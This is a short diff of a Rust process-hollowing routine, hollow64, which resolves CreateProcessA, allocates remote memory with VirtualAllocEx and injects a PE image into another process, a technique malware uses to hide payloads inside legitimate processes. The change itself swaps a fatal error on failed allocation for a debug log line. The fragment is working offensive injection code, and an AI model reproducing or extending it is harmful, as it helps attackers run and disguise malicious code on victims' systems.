@@ -24,7 +24,7 @@ use log::{debug, error, info, warn};
 pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
     // 1. Retrieve functions with GetProcAddress
     info!("1. Retrieve functions with GetProcAddress");
-    unsafe{
+    unsafe{ 
         // Create functions pointers. Source : https://github.com/memN0ps/srdi-rs
         #[allow(non_camel_case_types)]
         type fnCreateProcessA = unsafe extern "system" fn(
@@ -289,7 +289,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
         debug!("________________ remote_pe_base_address : {:?}",new_dest_image_base_address);
 
         if new_dest_image_base_address as u64 == 0x0 as u64 {
-            bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.");
+            debug!("VirtualAllocEx failed.");
         };
 
         // 7. Change base address (with value got at step 6 = value got a step 3) of PE to inject before writing it in remote process
